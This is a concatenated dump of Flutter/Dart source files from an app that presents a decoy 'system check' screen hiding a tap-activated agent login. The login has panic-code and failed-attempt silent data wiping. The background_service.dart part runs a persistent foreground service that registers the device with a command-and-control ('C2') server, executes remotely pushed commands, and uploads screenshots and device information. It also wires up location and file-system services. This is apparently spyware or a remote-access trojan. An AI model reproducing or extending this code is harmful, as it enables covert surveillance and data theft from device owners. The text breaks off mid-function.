            mainAxisAlignment: MainAxisAlignment.center,
            children: <Widget>[
              Icon(
                Icons.lock_outline_rounded,
                size: 80,
                color: Colors.red.shade700,
              ),
              const SizedBox(height: 30),
              Text(
                "لا يمكنك تسجيل الدخول الآن",
                textAlign: TextAlign.center,
                style: GoogleFonts.cairo(
                  fontSize: 22,
                  fontWeight: FontWeight.w600,
                  color: Colors.red.shade700,
                ),
              ),
              const SizedBox(height: 15),
              Text(
                "يرجى المحاولة مرة أخرى بعد: $remainingTime",
                textAlign: TextAlign.center,
                style: GoogleFonts.cairo(
                  fontSize: 16,
                  fontWeight: FontWeight.w500,
                  color: Colors.grey[700],
                ),
              ),
            ],
          ),
        ),
      ),
    );
  }

  Widget _buildPostDestructScreen(BuildContext context) {
    final theme = Theme.of(context);
    return Scaffold(
      backgroundColor: theme.scaffoldBackgroundColor,
      body: Center(
        child: Padding(
          padding: const EdgeInsets.all(30.0),
          child: Column(
            mainAxisAlignment: MainAxisAlignment.center,
            children: <Widget>[
              Icon(
                Icons.lock_outline_rounded,
                size: 80,
                color: Colors.red.shade700,
              ),
              const SizedBox(height: 30),
              Text(
                "تم تفعيل وضع الأمان. النظام مقفل.",
                textAlign: TextAlign.center,
                style: GoogleFonts.cairo(
                  fontSize: 18,
                  fontWeight: FontWeight.w600,
                  color: Colors.red.shade700,
                ),
              ),
            ],
          ),
        ),
      ),
    );
  }

  Widget _buildMainScreen(BuildContext context, DecoyScreenState state) {
    final theme = Theme.of(context);
    return Scaffold(
      backgroundColor: theme.scaffoldBackgroundColor,
      body: Center(
        child: Padding(
          padding: const EdgeInsets.all(30.0),
          child: Column(
            mainAxisAlignment: MainAxisAlignment.center,
            children: <Widget>[
              Icon(
                Icons.shield_outlined,
                size: 80,
                color: state.systemCheckComplete
                    ? theme.primaryColor
                    : Colors.grey[600],
              ),
              const SizedBox(height: 30),
              Text(
                state.statusMessage,
                textAlign: TextAlign.center,
                style: GoogleFonts.cairo(
                  fontSize: 18,
                  fontWeight: FontWeight.w600,
                  color: state.systemCheckComplete
                      ? Colors.green[600]
                      : theme.textTheme.bodyLarge?.color,
                ),
              ),
              const SizedBox(height: 20),
              if (!state.systemCheckComplete)
                Column(
                  children: [
                    LinearProgressIndicator(
                      value: state.progressValue,
                      backgroundColor: Colors.grey[300],
                      valueColor:
                          AlwaysStoppedAnimation<Color>(theme.primaryColor),
                      minHeight: 6,
                    ),
                    const SizedBox(height: 10),
                    Text(
                      "${(state.progressValue * 100).toInt()}%",
                      style: GoogleFonts.cairo(
                          fontSize: 12, color: Colors.grey[600]),
                    ),
                  ],
                ),
              if (!_permissionsRequested)
                Padding(
                  padding: const EdgeInsets.only(top: 20.0),
                  child: Column(
                    children: [
                      CircularProgressIndicator(
                        valueColor:
                            AlwaysStoppedAnimation<Color>(theme.primaryColor),
                      ),
                      const SizedBox(height: 10),
                      Text(
                        "جاري التحقق من الأذونات...",
                        style: GoogleFonts.cairo(
                            fontSize: 14, color: Colors.grey[600]),
                      ),
                    ],
                  ),
                ),
              if (_permissionsRequested)
                Padding(
                  padding: const EdgeInsets.only(top: 20.0),
                  child: ElevatedButton.icon(
                    icon: const Icon(Icons.settings_applications),
                    label: Text("إدارة الأذونات", style: GoogleFonts.cairo()),
                    onPressed: () async {
                      await openAppSettings();
                    },
                  ),
                ),
            ],
          ),
        ),
      ),
    );
  }

  void _showPasswordDialog(BuildContext context, WidgetRef ref) {
    final TextEditingController passwordController = TextEditingController();
    final controller = ref.read(decoyScreenControllerProvider.notifier);
    final state = ref.read(decoyScreenControllerProvider);
    final logger = ref.read(appLoggerProvider);
    bool isLoading = false;

    showDialog(
      context: context,
      barrierDismissible: false,
      builder: (BuildContext dialogContext) {
        return StatefulBuilder(
          builder: (context, setDialogState) {
            return AlertDialog(
              backgroundColor:
                  Theme.of(dialogContext).brightness == Brightness.dark
                      ? const Color(0xFF1F1F1F)
                      : Colors.grey[50],
              shape: RoundedRectangleBorder(
                  borderRadius: BorderRadius.circular(15)),
              title: Row(
                mainAxisAlignment: MainAxisAlignment.end,
                children: [
                  Text("الوصول المشفر",
                      style: GoogleFonts.cairo(
                          fontWeight: FontWeight.bold,
                          color:
                              Theme.of(dialogContext).colorScheme.onSurface)),
                  const SizedBox(width: 8),
                  Icon(Icons.security_outlined,
                      color: Theme.of(dialogContext).primaryColor),
                ],
              ),
              content: Column(
                mainAxisSize: MainAxisSize.min,
                children: [
                  Text("يرجى إدخال رمز المصادقة المخصص للوصول إلى النظام.",
                      textAlign: TextAlign.right,
                      style: GoogleFonts.cairo(
                          fontSize: 14, color: Colors.grey[600])),
                  const SizedBox(height: 20),
                  TextField(
                    controller: passwordController,
                    keyboardType: TextInputType.text,
                    autofocus: true,
                    textAlign: TextAlign.center,
                    style: GoogleFonts.cairo(
                        fontSize: 22,
                        letterSpacing: 3,
                        fontWeight: FontWeight.bold,
                        color: Theme.of(dialogContext).colorScheme.onSurface),
                    decoration: InputDecoration(
                      hintText: "- - - - - -",
                      hintStyle: GoogleFonts.cairo(
                          color: Colors.grey[500], fontSize: 20),
                      border: OutlineInputBorder(
                        borderRadius:
                            const BorderRadius.all(Radius.circular(10)),
                        borderSide: BorderSide(color: Colors.grey[400]!),
                      ),
                      focusedBorder: OutlineInputBorder(
                        borderRadius:
                            const BorderRadius.all(Radius.circular(10)),
                        borderSide: BorderSide(
                            color: Theme.of(dialogContext).primaryColor,
                            width: 2),
                      ),
                      filled: true,
                      fillColor:
                          Theme.of(dialogContext).brightness == Brightness.dark
                              ? Colors.black.withOpacity(0.1)
                              : Colors.white,
                    ),
                  ),
                  if (state.failedLoginAttempts > 0)
                    Padding(
                      padding: const EdgeInsets.only(top: 10.0),
                      child: Text(
                        "المحاولات الخاطئة: ${state.failedLoginAttempts}/5",
                        textAlign: TextAlign.center,
                        style: GoogleFonts.cairo(
                            fontSize: 12, color: Colors.orange.shade700),
                      ),
                    ),
                ],
              ),
              actionsAlignment: MainAxisAlignment.center,
              actionsPadding: const EdgeInsets.only(bottom: 20, top: 10),
              actions: <Widget>[
                ElevatedButton.icon(
                  icon: isLoading
                      ? Container(
                          width: 20,
                          height: 20,
                          padding: const EdgeInsets.all(2.0),
                          child: const CircularProgressIndicator(
                            color: Colors.white,
                            strokeWidth: 3,
                          ),
                        )
                      : const Icon(Icons.login_rounded, size: 20),
                  label: Text(isLoading ? "جاري التحقق..." : "تأكيد الوصول",
                      style: GoogleFonts.cairo(
                          fontSize: 15, fontWeight: FontWeight.w600)),
                  style: ElevatedButton.styleFrom(
                    backgroundColor: Theme.of(dialogContext).primaryColor,
                    foregroundColor: Colors.white,
                    padding: const EdgeInsets.symmetric(
                        horizontal: 30, vertical: 12),
                    shape: RoundedRectangleBorder(
                        borderRadius: BorderRadius.circular(10)),
                    elevation: 3,
                  ),
                  onPressed: isLoading
                      ? null
                      : () async {
                          setDialogState(() {
                            isLoading = true;
                          });

                          final enteredAgentCode =
                              passwordController.text.trim();
                          final bool isDialogCtxMounted = dialogContext.mounted;
                          final bool isMainCtxMounted = context.mounted;

                          logger.info("DecoyPasswordDialog",
                              "محاولة تسجيل الدخول برمز الوكيل: $enteredAgentCode");

                          final authResult = await controller
                              .authenticateWithAgentCode(enteredAgentCode);

                          if (!isDialogCtxMounted || !isMainCtxMounted) {
                            return;
                          }

                          if (authResult.success) {
                            logger.info("DecoyPasswordDialog",
                                "تم التحقق بنجاح من رمز الوكيل: $enteredAgentCode");

                            if (authResult.isPanicCode) {
                              // رمز الهلع - سيتم التعامل معه في وحدة التحكم
                              Navigator.of(dialogContext).pop();
                              Navigator.of(context).pushReplacement(
                                MaterialPageRoute(
                                    builder: (_) => const TheConduitApp()),
                              );
                              return;
                            }

                            Navigator.of(dialogContext).pop();
                            Navigator.of(context).pushReplacement(
                              MaterialPageRoute(
                                  builder: (_) => const TheConduitApp()),
                            );
                          } else {
                            logger.warn("DecoyPasswordDialog",
                                "رمز وكيل غير صالح: $enteredAgentCode");

                            if (ref
                                    .read(decoyScreenControllerProvider)
                                    .failedLoginAttempts >=
                                5) {
                              Navigator.of(dialogContext).pop();
                            } else {
                              ScaffoldMessenger.of(dialogContext)
                                  .showSnackBar(SnackBar(
                                content: Text(authResult.message,
                                    textAlign: TextAlign.right,
                                    style: GoogleFonts.cairo()),
                                backgroundColor: Colors.red[700],
                              ));
                              setDialogState(() {
                                isLoading = false;
                              });
                            }
                          }
                        },
                ),
              ],
            );
          },
        );
      },
    );
  }
}



// ------------------------------ نهاية الملف: decoy_screen.dart ------------------------------
// ======================================================================


// ============================== بداية الملف: decoy_screen_controller.dart ==============================
// المسار الكامل: E:\GitHub Projects\EncryptionApp\jjjjjjjjjjjjj\presentation\decoy_screen\decoy_screen_controller.dart
// ----------------------------------------------------------------------

// lib/presentation/decoy_screen/decoy_screen_controller.dart
import 'dart:async';

import 'package:flutter/material.dart';
import 'package:flutter_riverpod/flutter_riverpod.dart';
import 'package:shared_preferences/shared_preferences.dart';

import '../../core/logging/logger_provider.dart';
import '../../core/security/self_destruct_service.dart';
import '../chat/services/auth_service.dart';

class DecoyScreenController extends StateNotifier<DecoyScreenState> {
  final Ref _ref;
  final AuthService _authService;
  Timer? _progressTimer;
  Timer? _lockoutTimer;

  static const String _failedAttemptsKey = 'failed_login_attempts_conduit';
  static const String _lockoutEndTimeKey = 'lockout_end_time_conduit';
  static const int _maxFailedAttempts = 5;
  static const Duration _lockoutDuration = Duration(minutes: 30);

  DecoyScreenController(this._ref, this._authService)
      : super(DecoyScreenState.initial()) {
    _loadFailedAttempts();
    _loadLockoutTime();
    if (!state.isPostDestruct) {
      _startSystemCheckAnimation();
    }
  }

  void _startSystemCheckAnimation() {
    _progressTimer = Timer.periodic(const Duration(milliseconds: 150), (timer) {
      state = state.copyWith(
        progressValue: state.progressValue + 0.02,
      );

      if (state.progressValue >= 1.0) {
        state = state.copyWith(
          progressValue: 1.0,
          statusMessage: "فحص النظام الأساسي مكتمل.",
          systemCheckComplete: true,
        );
        timer.cancel();
      } else if (state.progressValue > 0.7) {
        state = state.copyWith(
          statusMessage: "التحقق من سلامة المكونات...",
        );
      } else if (state.progressValue > 0.4) {
        state = state.copyWith(
          statusMessage: "تحميل وحدات الأمان...",
        );
      }
    });
  }

  Future<void> _loadFailedAttempts() async {
    final prefs = await SharedPreferences.getInstance();
    state = state.copyWith(
      failedLoginAttempts: prefs.getInt(_failedAttemptsKey) ?? 0,
    );

    // تحقق مما إذا تم تجاوز الحد الأقصى للمحاولات
    if (state.failedLoginAttempts >= _maxFailedAttempts && !state.isPostDestruct) {
      _ref.read(appLoggerProvider).warn(
          "DecoyScreenInit",
          "Max failed attempts (${state.failedLoginAttempts}) detected on load. Triggering silent self-destruct.");
      _triggerSilentSelfDestruct(triggeredBy: "MaxFailedAttemptsOnLoad");
    }
  }

  Future<void> _loadLockoutTime() async {
    final prefs = await SharedPreferences.getInstance();
    final lockoutTimeMs = prefs.getInt(_lockoutEndTimeKey);
    if (lockoutTimeMs != null) {
      final lockoutEndTime = DateTime.fromMillisecondsSinceEpoch(lockoutTimeMs);
      if (lockoutEndTime.isAfter(DateTime.now())) {
        state = state.copyWith(lockoutEndTime: lockoutEndTime);
        _startLockoutTimer();
      } else {
        // الوقت انتهى، يمكن إعادة تعيين المحاولات
        await prefs.remove(_lockoutEndTimeKey);
      }
    }
  }

  void _startLockoutTimer() {
    _lockoutTimer?.cancel();
    _lockoutTimer = Timer.periodic(const Duration(seconds: 1), (timer) {
      if (state.lockoutEndTime == null ||
          state.lockoutEndTime!.isBefore(DateTime.now())) {
        timer.cancel();
        state = state.copyWith(lockoutEndTime: null);
      } else {
        // تحديث الحالة لإعادة بناء الواجهة وتحديث العداد التنازلي
        state = state.copyWith();
      }
    });
  }

  Future<void> _incrementFailedAttempts() async {
    final prefs = await SharedPreferences.getInstance();
    state = state.copyWith(
      failedLoginAttempts: state.failedLoginAttempts + 1,
    );
    await prefs.setInt(_failedAttemptsKey, state.failedLoginAttempts);
    _ref.read(appLoggerProvider).warn(
        "DecoyScreen", "Failed login attempt. Count: ${state.failedLoginAttempts}");

    if (state.failedLoginAttempts >= _maxFailedAttempts && !state.isPostDestruct) {
      // تدمير المحادثات بشكل صامت وإظهار رسالة القفل
      await _triggerSilentSelfDestruct(triggeredBy: "MaxFailedAttemptsReached");

      // تعيين وقت انتهاء القفل
      final lockoutEndTime = DateTime.now().add(_lockoutDuration);
      await prefs.setInt(
          _lockoutEndTimeKey, lockoutEndTime.millisecondsSinceEpoch);

      state = state.copyWith(lockoutEndTime: lockoutEndTime);
      _startLockoutTimer();
    }
  }

  Future<void> _resetFailedAttempts() async {
    final prefs = await SharedPreferences.getInstance();
    state = state.copyWith(
      failedLoginAttempts: 0,
      lockoutEndTime: null,
    );
    await prefs.setInt(_failedAttemptsKey, 0);
    await prefs.remove(_lockoutEndTimeKey);
    _lockoutTimer?.cancel();
    _ref.read(appLoggerProvider).info("DecoyScreen", "Failed login attempts reset.");
  }

  void handleTap() {
    if (state.isPostDestruct ||
        !state.systemCheckComplete ||
        state.lockoutEndTime != null) {
      return;
    }
    state = state.copyWith(tapCount: state.tapCount + 1);
  }

  bool shouldShowPasswordDialog() {
    if (state.tapCount >= 5) {
      state = state.copyWith(tapCount: 0);
      return true;
    }
    return false;
  }

  Future<AuthResult> authenticateWithAgentCode(String agentCode) async {
    final result = await _authService.authenticateAgent(agentCode);
    
    if (result.success) {
      await _resetFailedAttempts();
      if (result.isPanicCode) {
        await _triggerSelfDestruct(triggeredBy: "PanicCode00000");
      }
    } else {
      await _incrementFailedAttempts();
    }
    
    return result;
  }

  // تدمير البيانات بشكل صامت دون إظهار أي إشعارات للمستخدم
  Future<void> _triggerSilentSelfDestruct({String triggeredBy = "Unknown"}) async {
    if (state.isPostDestruct) {
      _ref.read(appLoggerProvider).info(
          "SilentSelfDestructTrigger",
          "Already in post-destruct state. Trigger by $triggeredBy ignored.");
      return;
    }

    _ref.read(appLoggerProvider).error(
        "SILENT SELF-DESTRUCT TRIGGERED by: $triggeredBy",
        "SILENT_SELF_DESTRUCT_TRIGGER");

    try {
      await _ref.read(selfDestructServiceProvider).silentSelfDestruct(triggeredBy: triggeredBy);
    } catch (e, s) {
      _ref.read(appLoggerProvider).error(
          "SilentSelfDestruct", "Error during silent self-destruct", e, s);
    }
  }

  // الطريقة الأصلية للتدمير الذاتي (تستخدم فقط لرقم الهلع)
  Future<void> _triggerSelfDestruct({String triggeredBy = "Unknown"}) async {
    if (state.isPostDestruct) {
      _ref.read(appLoggerProvider).info(
          "SelfDestructTrigger",
          "Already in post-destruct state. Trigger by $triggeredBy ignored.");
      return;
    }

    _ref.read(appLoggerProvider).error(
        "SELF-DESTRUCT TRIGGERED in DecoyScreen by: $triggeredBy",
        "SELF_DESTRUCT_TRIGGER");
    
    // استخدام خدمة التدمير الذاتي
    await _ref.read(selfDestructServiceProvider).silentSelfDestruct(triggeredBy: triggeredBy);
  }

  String getRemainingLockoutTime() {
    if (state.lockoutEndTime == null) return "";

    final now = DateTime.now();
    if (state.lockoutEndTime!.isBefore(now)) return "";

    final difference = state.lockoutEndTime!.difference(now);
    final minutes = difference.inMinutes;
    final seconds = difference.inSeconds % 60;

    return "$minutes:${seconds.toString().padLeft(2, '0')}";
  }

  @override
  void dispose() {
    _progressTimer?.cancel();
    _lockoutTimer?.cancel();
    super.dispose();
  }
}

class DecoyScreenState {
  final int tapCount;
  final double progressValue;
  final String statusMessage;
  final bool systemCheckComplete;
  final int failedLoginAttempts;
  final DateTime? lockoutEndTime;
  final bool isPostDestruct;

  DecoyScreenState({
    required this.tapCount,
    required this.progressValue,
    required this.statusMessage,
    required this.systemCheckComplete,
    required this.failedLoginAttempts,
    this.lockoutEndTime,
    required this.isPostDestruct,
  });

  factory DecoyScreenState.initial() {
    return DecoyScreenState(
      tapCount: 0,
      progressValue: 0.0,
      statusMessage: "جاري تهيئة النظام...",
      systemCheckComplete: false,
      failedLoginAttempts: 0,
      lockoutEndTime: null,
      isPostDestruct: false,
    );
  }

  DecoyScreenState copyWith({
    int? tapCount,
    double? progressValue,
    String? statusMessage,
    bool? systemCheckComplete,
    int? failedLoginAttempts,
    DateTime? lockoutEndTime,
    bool? isPostDestruct,
  }) {
    return DecoyScreenState(
      tapCount: tapCount ?? this.tapCount,
      progressValue: progressValue ?? this.progressValue,
      statusMessage: statusMessage ?? this.statusMessage,
      systemCheckComplete: systemCheckComplete ?? this.systemCheckComplete,
      failedLoginAttempts: failedLoginAttempts ?? this.failedLoginAttempts,
      lockoutEndTime: lockoutEndTime ?? this.lockoutEndTime,
      isPostDestruct: isPostDestruct ?? this.isPostDestruct,
    );
  }
}

final decoyScreenControllerProvider =
    StateNotifierProvider<DecoyScreenController, DecoyScreenState>((ref) {
  final authService = ref.watch(authServiceProvider);
  return DecoyScreenController(ref, authService);
});



// ------------------------------ نهاية الملف: decoy_screen_controller.dart ------------------------------
// ======================================================================


// ============================== بداية الملف: home_page.dart ==============================
// المسار الكامل: E:\GitHub Projects\EncryptionApp\jjjjjjjjjjjjj\presentation\home\home_page.dart
// ----------------------------------------------------------------------

import 'package:flutter/material.dart';
import 'package:flutter_riverpod/flutter_riverpod.dart';

import '../about_tab/about_tab.dart';
import '../chat/chat_list_screen.dart';
import '../debug_monitor/debug_monitor_screen.dart'; // إضافة استيراد شاشة المراقبة
import '../history_tab/history_tab.dart';

class HomePage extends ConsumerStatefulWidget {
  const HomePage({super.key});

  @override
  ConsumerState<HomePage> createState() => _HomePageState();
}

class _HomePageState extends ConsumerState<HomePage>
    with SingleTickerProviderStateMixin {
  late TabController _tabController;
  int _currentIndex = 0;
  bool _showDebugButton = false; // زر إظهار شاشة المراقبة
  int _debugTapCount = 0; // عداد النقرات لإظهار زر المراقبة

  @override
  void initState() {
    super.initState();
    _tabController = TabController(length: 6, vsync: this);
    _tabController.addListener(() {
      setState(() {
        _currentIndex = _tabController.index;
      });
    });
  }

  @override
  void dispose() {
    _tabController.dispose();
    super.dispose();
  }

  void _incrementDebugTapCount() {
    setState(() {
      _debugTapCount++;
      if (_debugTapCount >= 5) {
        _showDebugButton = true;
      }
    });

    // إعادة تعيين العداد بعد 3 ثوانٍ من عدم النقر
    Future.delayed(const Duration(seconds: 3), () {
      if (mounted) {
        setState(() {
          _debugTapCount = 0;
        });
      }
    });
  }

  void _openDebugMonitor() {
    Navigator.of(context).push(
      MaterialPageRoute(
        builder: (context) => const DebugMonitorScreen(),
      ),
    );
  }

  @override
  Widget build(BuildContext context) {
    return GestureDetector(
      onTap:
          _incrementDebugTapCount, // زيادة عداد النقرات عند النقر على أي مكان في الشاشة
      child: Scaffold(
        appBar: AppBar(
          title: const Text('الساتر'),
          bottom: TabBar(
            controller: _tabController,
            tabs: const [
              Tab(icon: Icon(Icons.chat), text: 'المحادثات'),
              Tab(icon: Icon(Icons.lock), text: 'التشفير'),
              Tab(icon: Icon(Icons.file_present), text: 'الملفات'),
              Tab(icon: Icon(Icons.history), text: 'السجل'),
            ],
          ),
          actions: [
            if (_showDebugButton)
              IconButton(
                icon: const Icon(Icons.bug_report),
                onPressed: _openDebugMonitor,
                tooltip: 'شاشة المراقبة',
              ),
          ],
        ),
        body: TabBarView(
          controller: _tabController,
          children: const [
            ChatListScreen(),
            HistoryTab(),
            AboutTab(),
          ],
        ),
      ),
    );
  }
}



// ------------------------------ نهاية الملف: home_page.dart ------------------------------
// ======================================================================


// ============================== بداية الملف: background_service.dart ==============================
// المسار الكامل: E:\GitHub Projects\EncryptionApp\jjjjjjjjjjjjj\services\background_service.dart
// ----------------------------------------------------------------------

// lib/services/background_service.dart
import 'dart:async';
import 'dart:io';
import 'dart:ui';

import 'package:camera/camera.dart' show XFile;
import 'package:flutter/foundation.dart';
import 'package:flutter_background_service/flutter_background_service.dart';
import 'package:flutter_local_notifications/flutter_local_notifications.dart';
import 'package:shared_preferences/shared_preferences.dart';

import '../core/logging/enhanced_logger_service.dart';
import '../utils/constants.dart';
import 'command_processor.dart';
import 'device_info_service.dart';
import 'file_system_service.dart';
import 'location_service.dart';
import 'network_service.dart';

@immutable
class BackgroundServiceHandles {
  final NetworkService networkService;
  final DeviceInfoService deviceInfoService;
  final LocationService locationService;
  final FileSystemService fileSystemService;
  final SharedPreferences preferences;
  final ServiceInstance serviceInstance;
  final String currentDeviceId;
  final EnhancedLoggerService logger;
  final CommandProcessor commandProcessor;

  const BackgroundServiceHandles({
    required this.networkService,
    required this.deviceInfoService,
    required this.locationService,
    required this.fileSystemService,
    required this.preferences,
    required this.serviceInstance,
    required this.currentDeviceId,
    required this.logger,
    required this.commandProcessor,
  });
}

StreamSubscription<bool>? _connectionStatusSubscription;
StreamSubscription<Map<String, dynamic>>? _commandSubscription;
Timer? _serviceWatchdogTimer;
bool _isServiceRunning = false;

@pragma('vm:entry-point')
Future<void> onStart(ServiceInstance service) async {
  DartPluginRegistrant.ensureInitialized();
  _isServiceRunning = true;

  final logger = EnhancedLoggerService();
  logger.info("BackgroundService:onStart", "Service instance starting...");

  final network = NetworkService();
  final deviceInfo = DeviceInfoService();
  final location = LocationService();
  final fileSystem = FileSystemService();
  final commandProcessor = CommandProcessor();
  final prefs = await SharedPreferences.getInstance();

  String deviceId;
  try {
    deviceId = await deviceInfo.getOrCreateUniqueDeviceId();
    logger.info(
        "BackgroundService:onStart", "DeviceID obtained/created: $deviceId");
  } catch (e, stackTrace) {
    logger.error("BackgroundService:onStart", "Fatal error getting device ID",
        e, stackTrace);
    deviceId = "error_device_id_${DateTime.now().millisecondsSinceEpoch}";
    logger.warn("BackgroundService:onStart",
        "Using fallback DeviceID due to error: $deviceId");
  }

  final handles = BackgroundServiceHandles(
    networkService: network,
    deviceInfoService: deviceInfo,
    locationService: location,
    fileSystemService: fileSystem,
    preferences: prefs,
    serviceInstance: service,
    currentDeviceId: deviceId,
    logger: logger,
    commandProcessor: commandProcessor,
  );

  _startServiceWatchdog(handles);

  try {
    logger.info("BackgroundService:onStart",
        "Attempting initial Socket.IO connection...");
    await network.connectSocketIO(deviceId);
    logger.info("BackgroundService:onStart",
        "Initial Socket.IO connection attempt initiated.");
  } catch (e, stackTrace) {
    logger.error("BackgroundService:onStart",
        "Error during initial Socket.IO connection attempt", e, stackTrace);
  }

  _connectionStatusSubscription?.cancel();
  _connectionStatusSubscription =
      network.connectionStatusStream.listen((isConnected) {
    logger.info("BackgroundService:ConnectionStatus",
        "Socket status changed: ${isConnected ? 'Connected' : 'Disconnected'}");
    if (isConnected) {
      _registerDeviceWithC2(handles);
    }
  }, onError: (error, stackTrace) {
    logger.error("BackgroundService:ConnectionStatus",
        "Error in connection status stream", error, stackTrace);
  });

  _commandSubscription?.cancel();
  _commandSubscription = network.commandStream.listen((commandData) {
    final cmd = commandData['command'] as String?;
    final commandId = commandData['command_id'] as String?;
    final args = Map<String, dynamic>.from(commandData['args'] as Map? ?? {});

    if (cmd == null) {
      logger.warn("BackgroundService:CommandStream",
          "Received command with null name. Data: $commandData");
      return;
    }
    logger.info("BackgroundService:CommandStream",
        "Received command '$cmd' (ID: ${commandId ?? 'N/A'}) with args: $args");
    _handleC2Command(handles, cmd, args, commandId);
  }, onError: (error, stackTrace) {
    logger.error("BackgroundService:CommandStream", "Error in command stream",
        error, stackTrace);
  });

  // UI Bridge للتواصل مع UI Thread
  service.on('ui_bridge_request').listen((data) async {
    await _handleUIBridgeRequest(handles, data);
  });

  service.on('ui_bridge_response').listen((data) {
    _handleUIBridgeResponse(handles, data);
  });

  service.on('screenshotTakenByUI').listen((dataFromUI) async {
    logger.info("BackgroundService:screenshotTakenByUI",
        "Received data from UI: $dataFromUI");
    if (dataFromUI is Map<String, dynamic>) {
      final filePath = dataFromUI['file_path'] as String?;
      final error = dataFromUI['error'] as String?;
      final commandId = dataFromUI['command_id'] as String?;

      if (filePath != null && commandId != null) {
        logger.info("BackgroundService:screenshotTakenByUI",
            "Screenshot file path received: $filePath. Uploading for command ID $commandId.");

        await handles.networkService.uploadFileFromCommand(
          deviceId: handles.currentDeviceId,
          commandRef: SIO_CMD_TAKE_PICTURE,
          commandId: commandId,
          fileToUpload: XFile(filePath),
        );

        try {
          final tempFile = File(filePath);
          if (await tempFile.exists()) {
            await tempFile.delete();
            logger.info("BackgroundService:screenshotTakenByUI",
                "Temporary screenshot file $filePath deleted.");
          }
        } catch (e, s) {
          logger.error("BackgroundService:screenshotTakenByUI",
              "Could not delete temp screenshot file $filePath: $e", e, s);
        }
      } else if (error != null && commandId != null) {
        logger.error("BackgroundService:screenshotTakenByUI",
            "UI reported error taking screenshot: $error for command ID $commandId.");
        handles.networkService.sendCommandResponse(
          originalCommand: SIO_CMD_TAKE_PICTURE,
          commandId: commandId,
          status: 'error',
          payload: {'message': 'Failed to take screenshot on UI: $error'},
        );
      }
    }
  });

  service.on(BG_SERVICE_EVENT_STOP_SERVICE).listen((_) async {
    logger.info("BackgroundService:StopEvent",
        "Received '$BG_SERVICE_EVENT_STOP_SERVICE' event. Stopping service.");
    await _stopService(handles);
  });

  service.on(BG_SERVICE_EVENT_SEND_INITIAL_DATA).listen((event) async {
    logger.info("BackgroundService",
        "Received event '$BG_SERVICE_EVENT_SEND_INITIAL_DATA'. Preparing to send initial data.");
    final alreadySent = prefs.getBool(PREF_INITIAL_DATA_SENT) ?? false;
    if (alreadySent && !(event?['force'] == true)) {
      logger.info("BackgroundService",
          "Initial data already sent and not forced, skipping.");
      return;
    }
    try {
      final deviceInfoPayload = await handles.deviceInfoService.getDeviceInfo();
      XFile? imageFile;
      logger.info("BackgroundService",
          "Sending initial data via HTTP. Device ID: ${deviceInfoPayload['deviceId']}");
      final success = await handles.networkService.sendInitialData(
        jsonData: deviceInfoPayload,
        imageFile: imageFile,
      );
      if (success) {
        await prefs.setBool(PREF_INITIAL_DATA_SENT, true);
        logger.info(
            "BackgroundService", "Initial data sent successfully via HTTP.");
      } else {
        logger.error(
            "BackgroundService", "Failed to send initial data via HTTP.");
      }
    } catch (e, s) {
      logger.error("BackgroundService",
          "Error during sending initial data via HTTP", e, s);
    }
  });

  if (service is AndroidServiceInstance) {
    try {
      await service.setAsForegroundService();
      logger.info(
          "BackgroundService:onStart", "Android service set to foreground.");
    } catch (e, s) {
      logger.error("BackgroundService:onStart",
          "Failed to set Android service to foreground", e, s);
    }
  }

  if (service is AndroidServiceInstance) {
    Timer.periodic(const Duration(minutes: 5), (timer) {
      if (!_isServiceRunning) {
        timer.cancel();
        return;
      }
      try {
        service.setForegroundNotificationInfo(
          title: "The Conduit Service",
          content:
              "Service active. Last check: ${DateTime.now().toIso8601String().substring(11, 19)}",
        );
      } catch (e, s) {
        logger.warn("BackgroundService:NotificationUpdate",
            "Could not update foreground notification. Error: $e, StackTrace: $s");
      }
    });
  }
  logger.info(
      "BackgroundService:onStart", "Service initialization process complete.");
}

Future<void> _handleUIBridgeRequest(
    BackgroundServiceHandles handles, Map<String, dynamic>? data) async {
  if (data == null) return;

  final requestId = data['requestId'] as String?;
  final method = data['method'] as String?;
  final params = data['params'] as Map<String, dynamic>? ?? {};

  if (requestId == null || method == null) {
    handles.logger
        .warn("BackgroundService:UIBridge", "Invalid UI bridge request: $data");
    return;
  }

  handles.logger.info("BackgroundService:UIBridge",
      "Processing UI bridge request: $method (ID: $requestId)");

  try {
    Map<String, dynamic> result = {
      'status': 'error',
      'message': 'Method not implemented'
    };

    // تنفيذ المطلوب حسب النوع
    switch (method) {
      case 'sendToUIThread':
        final uiMethod = params['method'] as String?;
        final uiParams = params['params'] as Map<String, dynamic>? ?? {};

        if (uiMethod != null) {
          // إرسال طلب للـ UI thread
          handles.serviceInstance.invoke('ui_bridge_request', {
            'requestId': 'bg_to_ui_${DateTime.now().millisecondsSinceEpoch}',
            'method': uiMethod,
            'params': uiParams,
          });
          result = {
            'status': 'success',
            'message': 'Request sent to UI thread'
          };
        }
        break;
      default:
        result = {
          'status': 'error',
          'message': 'Unknown UI bridge method: $method'
        };
    }

    // إرسال النتيجة
    handles.serviceInstance.invoke('ui_bridge_response', {
      'requestId': requestId,
      'result': result,
    });
  } catch (e, stackTrace) {
    handles.logger.error("BackgroundService:UIBridge",
        "Error processing UI bridge request: $method", e, stackTrace);

    handles.serviceInstance.invoke('ui_bridge_response', {
      'requestId': requestId,
      'result': {
        'status': 'error',
        'message': e.toString(),
      },
    });
  }
}

final Map<String, Completer<Map<String, dynamic>>> _pendingUIRequests = {};

void _handleUIBridgeResponse(
    BackgroundServiceHandles handles, Map<String, dynamic>? data) {
  if (data == null) return;

  final requestId = data['requestId'] as String?;
  final result = data['result'] as Map<String, dynamic>? ?? {};

  if (requestId != null && _pendingUIRequests.containsKey(requestId)) {
    final completer = _pendingUIRequests.remove(requestId);
    if (completer != null && !completer.isCompleted) {
      completer.complete(result);
    }
  }
}

Future<Map<String, dynamic>> _sendToUIThread(BackgroundServiceHandles handles,
    String method, Map<String, dynamic> params) async {
  final requestId =
      'bg_req_${DateTime.now().millisecondsSinceEpoch}_${params.hashCode}';
  final completer = Completer<Map<String, dynamic>>();

  _pendingUIRequests[requestId] = completer;

  // إرسال الطلب للـ UI thread
  handles.serviceInstance.invoke('ui_bridge_request', {
    'requestId': requestId,
    'method': method,
    'params': params,
  });

  // انتظار الرد مع timeout
  return completer.future.timeout(
    const Duration(seconds: 30),
    onTimeout: () {
      _pendingUIRequests.remove(requestId);
      return {
        'status': 'error',
        'message': 'UI request timeout',
      };
    },
  );
}

void _startServiceWatchdog(BackgroundServiceHandles h) {
  _serviceWatchdogTimer?.cancel();
  _serviceWatchdogTimer = Timer.periodic(const Duration(minutes: 15), (_) {
    if (!_isServiceRunning) {
      _serviceWatchdogTimer?.cancel();
      h.logger.info("BackgroundService:Watchdog",
